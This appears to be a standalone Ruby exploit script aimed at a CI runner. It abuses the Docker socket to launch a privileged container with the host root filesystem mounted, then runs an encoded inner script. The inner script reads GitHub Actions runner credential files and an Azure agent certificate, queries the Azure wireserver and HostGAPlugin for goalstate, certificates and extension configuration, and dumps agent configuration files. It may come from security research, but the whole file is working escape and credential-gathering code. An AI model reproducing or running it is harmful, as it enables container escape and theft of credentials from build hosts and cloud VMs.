require 'socket'
require 'json'

puts "VX_EXEC_UID=#{`id -u`.strip}"

def dapi(method, path, body = nil)
  s = UNIXSocket.new('/var/run/docker.sock')
  b = body ? JSON.generate(body) : ''
  s.write("#{method} #{path} HTTP/1.1\r\nHost: docker\r\nConnection: close\r\nContent-Type: application/json\r\nContent-Length: #{b.bytesize}\r\n\r\n#{b}")
  buf = +''
  begin
    loop { buf << s.readpartial(8192) }
  rescue EOFError, IOError
  end
  s.close
  hdr, _, pl = buf.partition("\r\n\r\n")
  if hdr =~ /chunked/i
    out = +''; i = 0
    while i < pl.bytesize
      j = pl.index("\r\n", i); break unless j
      n = pl[i...j].to_i(16); break if n.zero?
      out << pl[j + 2, n]; i = j + 2 + n + 2
    end
    pl = out
  end
  [hdr[/\d{3}/].to_i, pl]
rescue => e
  [-1, "ERR #{e.class}: #{e.message[0, 120]}"]
end

inner = <<'RUBY'
require 'net/http'
require 'json'
require 'digest'
require 'base64'

HOST = '/host'
CRED_DIR = "#{HOST}/home/runner/actions-runner/cached/2.337.0"

def mask_secrets(s)
  s.gsub(/("[^"]*(?:token|privatekey|secret|password|accesskey|signature)[^"]*"\s*:\s*")([^"]*)(")/i) do
    "#{$1}#{$2[0, 8]}...(len=#{$2.length})#{$3}"
  end
end

def mask_blobs(s)
  s.gsub(/[A-Za-z0-9+\/=\r\n]{400,}/) do |m|
    t = m.gsub(/\s/, '')
    "#{t[0, 60]}...(b64len=#{t.length})"
  end
end

# ---- transport cert (DER->b64) for wireserver/hostplugin auth ----
der = `openssl x509 -in #{HOST}/var/lib/waagent/TransportCert.pem -outform DER 2>/dev/null`
CERT_B64 = der.empty? ? nil : Base64.strict_encode64(der)
puts "VX_CERT der_len=#{der.bytesize} b64_len=#{CERT_B64 ? CERT_B64.length : 0}"

def http_get(host, port, path, headers = {})
  h = Net::HTTP.new(host, port)
  h.open_timeout = 4
  h.read_timeout = 6
  req = Net::HTTP::Get.new(path)
  headers.each { |k, v| req[k] = v }
  r = h.request(req)
  [r.code.to_s, r.body.to_s]
rescue => e
  ["ERR", "#{e.class}: #{e.message[0, 100]}"]
end

# ---- (a) runner cred files ----
puts "VX_A_CACHED_LS"
system("ls -la #{HOST}/home/runner/actions-runner/cached/ 2>&1")
system("ls -la #{CRED_DIR}/ 2>&1")
targets = %w[.credentials_rsaparams .credentials_migrated .credentials .agent .runner .setup_info]
targets.each do |f|
  p = "#{CRED_DIR}/#{f}"
  if File.exist?(p)
    raw = File.read(p) rescue ''
    puts "VX_A_FILE #{f} size=#{raw.bytesize} sha256=#{Digest::SHA256.hexdigest(raw)[0, 16]}"
    if f == '.credentials_rsaparams'
      begin
        j = JSON.parse(raw)
        puts "VX_A_RSAPARAMS top_keys=#{j.keys.inspect}"
        j.each { |k, v| puts "VX_A_RSAPARAMS key=#{k} type=#{v.class} len=#{v.to_s.length}" }
      rescue => e
        puts "VX_A_RSAPARAMS parse_err=#{e.message[0, 80]}"
      end
    else
      puts "VX_A_HEAD #{f}: #{mask_secrets(raw)[0, 200].inspect}"
    end
  else
    puts "VX_A_FILE #{f} ABSENT"
  end
end
puts "VX_A_GLOB"
Dir.glob("#{HOST}/home/runner/actions-runner/cached/*/.credentials*").each do |p|
  puts "VX_A_GLOB_HIT #{p} size=#{File.size(p)}"
end

# ---- (c-pre) goalstate for container/incarnation ----
gc, gs = http_get('168.63.129.16', 80, '/machine/?comp=goalstate',
                  CERT_B64 ? { 'x-ms-guest-agent-public-x509-cert' => CERT_B64 } : {})
puts "VX_WS goalstate -> #{gc} #{mask_blobs(gs)[0, 800].inspect}"
cid = gs[/<ContainerId>([^<]+)/, 1]
inc = gs[/<Incarnation>([^<]+)/, 1]
puts "VX_WS_PARSE container=#{cid} incarnation=#{inc}"

# ---- (b) HostGAPlugin 32526 ----
HP = %w[/ /health /vmSettings /machine/?comp=goalstate /machine/?comp=versions /machine/?comp=health /status]
r1 = HP.map { |p| [p, *http_get('168.63.129.16', 32526, p)] }
r1.each { |p, c, b| puts "VX_HP_R1 #{p} -> #{c} #{b[0, 300].inspect}" }
if r1.all? { |_, c, _| c == 'ERR' || c.to_i >= 400 }
  hdr = CERT_B64 ? { 'x-ms-guest-agent-public-x509-cert' => CERT_B64 } : {}
  r2 = HP.map { |p| [p, *http_get('168.63.129.16', 32526, p, hdr)] }
  r2.each { |p, c, b| puts "VX_HP_R2 #{p} -> #{c} #{b[0, 300].inspect}" }
  if r2.all? { |_, c, _| c == 'ERR' || c.to_i >= 400 }
    hdr2 = hdr.merge('x-ms-container-name' => cid.to_s)
    r3 = HP.map { |p| [p, *http_get('168.63.129.16', 32526, p, hdr2)] }
    r3.each { |p, c, b| puts "VX_HP_R3 #{p} -> #{c} #{b[0, 300].inspect}" }
  end
end

# ---- (c) wireserver full bodies ----
if cid && inc
  %w[extensionsConfig certificates hostingEnvironmentConfig].each do |comp|
    c, b = http_get('168.63.129.16', 80, "/machine/#{cid}/#{inc}?comp=#{comp}",
                    CERT_B64 ? { 'x-ms-guest-agent-public-x509-cert' => CERT_B64 } : {})
    puts "VX_WS #{comp} -> #{c} #{mask_blobs(mask_secrets(b))[0, 1500].inspect}"
  end
else
  puts "VX_WS_SKIP no container/incarnation parsed"
end

# ---- (d) ovf-env ----
ovf_path = "#{HOST}/var/lib/waagent/ovf-env.xml"
if File.exist?(ovf_path)
  ovf = File.read(ovf_path)
  ovf = ovf.gsub(/(<[\w:.]*Password[\w:.]*>)([^<]*)/i) { "#{$1}#{$2[0, 8]}...(len=#{$2.length})" }
  puts "VX_OVF_BEGIN"
  puts ovf[0, 4000]
  puts "VX_OVF_END"
else
  puts "VX_OVF missing"
end

# ---- (e) waagent.conf ----
conf = "#{HOST}/var/lib/waagent/waagent.conf"
if File.exist?(conf)
  puts "VX_CONF_BEGIN"
  puts File.read(conf).lines.first(40).join
  puts "VX_CONF_END"
else
  puts "VX_CONF missing"
end
puts "VX_INNER_DONE"
RUBY

inner_b64 = [inner].pack('m0')
cmd = "echo #{inner_b64} | base64 -d > /tmp/i.rb && ruby /tmp/i.rb 2>&1"

create_body = {
  Image: 'ghcr.io/actions/jekyll-build-pages:v1.0.13',
  Tty: true,
  Entrypoint: ['bash', '-c'],
  Cmd: [cmd],
  HostConfig: {
    Binds: ['/:/host'],
    PidMode: 'host',
    NetworkMode: 'host',
    Privileged: true
  }
}

code, body = dapi('POST', '/containers/create', create_body)
puts "VX_CREATE code=#{code} #{body[0, 300]}"
cid = (JSON.parse(body)['Id'] rescue nil)
if cid
  c2, b2 = dapi('POST', "/containers/#{cid}/start")
  puts "VX_START code=#{c2} #{b2[0, 200]}"
  c3, b3 = dapi('POST', "/containers/#{cid}/wait")
  puts "VX_WAIT code=#{c3} #{b3[0, 200]}"
  c4, logs = dapi('GET', "/containers/#{cid}/logs?stdout=1&stderr=1")
  puts "VX_LOGS code=#{c4}"
  scrub = logs.gsub(/[^[:print:]\n]/, '')
  puts 'VX_ESC_BEGIN'
  puts scrub[0, 9000]
  puts 'VX_ESC_END'
  c5, b5 = dapi('DELETE', "/containers/#{cid}?force=true")
  puts "VX_DEL code=#{c5}"
else
  puts 'VX_NO_CONTAINER'
end
